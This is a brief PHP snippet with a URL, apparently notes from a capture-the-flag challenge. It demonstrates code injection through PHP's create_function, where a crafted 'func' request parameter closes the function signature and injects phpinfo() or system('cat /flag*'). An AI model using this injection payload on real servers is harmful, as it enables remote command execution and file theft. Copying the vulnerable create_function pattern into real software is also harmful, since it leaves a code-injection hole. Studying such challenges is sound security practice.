<?php

$_REQUEST['func'] = '$a){}phpinfo();//';
create_function($_REQUEST['func'], 'flag');

function ($x) {

}; // create_function('$a,$b', 'return "ln($a) + ln($b) = " . log($a * $b);');
?>

http://2b62a42805674c48b66239b485ba3f8281e30043292e4d61.changame.ichunqiu.com/m4nag3r_u_dont_know/?func=$a){}system('cat /flag*');//